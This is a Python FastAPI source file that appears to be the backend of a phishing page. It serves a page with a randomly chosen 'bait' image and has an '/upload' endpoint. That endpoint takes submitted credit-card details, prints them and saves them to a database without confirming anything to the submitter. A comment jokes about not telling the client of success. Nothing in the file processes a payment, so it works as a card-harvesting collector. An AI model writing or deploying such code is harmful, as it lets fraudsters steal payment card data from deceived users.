from random import choice

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from model.CreditCard import CreditCard
from model.DatabaseHelper import create_db_and_tables, SessionDep


def lifespan(app):
    create_db_and_tables()
    yield
    # Put code in here to be run when shutting down

app = FastAPI(lifespan=lifespan)
app.mount(
    "/static",
    StaticFiles(directory="static"),
    name="static"
)
templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def main_page(request: Request):
    bait_to_color = {
        'bait_img.png': '#81746f',
        'way_too_large.png': '#fec97b',
        'hoarse.png': '#d2c1f0',
        'pink.png': "#f3bfd9",
    }
    bait_img, background_color = choice(list(bait_to_color.items()))
    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={
            'background_color': background_color,
            'bait_img': bait_img,
        },
    )


@app.post("/upload")
async def upload_details(credit_card: CreditCard, session: SessionDep):
    print(credit_card)
    # Validate Client side inputs
    validated = CreditCard.model_validate(credit_card)
    # Write Result to Database
    session.add(validated)
    session.commit()
    # TODO Tell client about success maybe. But why?
    return
